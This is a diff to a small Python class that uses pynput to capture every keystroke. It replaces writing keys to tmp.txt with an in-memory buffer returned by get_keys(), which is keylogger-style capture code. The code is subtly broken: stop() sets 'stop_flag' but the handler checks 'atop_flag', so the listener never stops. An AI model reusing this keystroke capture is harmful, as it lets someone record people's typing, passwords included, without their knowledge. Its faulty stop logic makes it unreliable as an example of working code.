@@ -1,11 +1,10 @@
 from pynput import keyboard
 
-TMP_FILE = "tmp.txt"
-
 class Listener:
     def __init__(self):
+        self.data = []
         self.listener = keyboard.Listener(on_press=self.on_press)
-        self.listener.daemon = True
+        self.atop_flag = False
     def on_press(self, key):
         try:
             char = key.char
@@ -15,13 +14,18 @@ class Listener:
             elif key == keyboard.Key.enter:
                 char = "\n"
         try:
-            with open(TMP_FILE, "a", encoding="utf-8") as f:
-                f.write(char)
+            self.data.append(char)
         except:
             pass
-    def start(self):
-        self.listener.start()
-        self.listener.join()
+        if self.atop_flag:
+            return False
 
-if __name__ == '__main__':
-    Listener().start()
+    def start(self):
+        with keyboard.Listener(on_press=self.on_press) as self.listener:
+            self.listener.join()
+    def stop(self):
+        self.stop_flag = True
+    def get_keys(self):
+        text = "".join(self.data)
+        self.data.clear()
+        return text
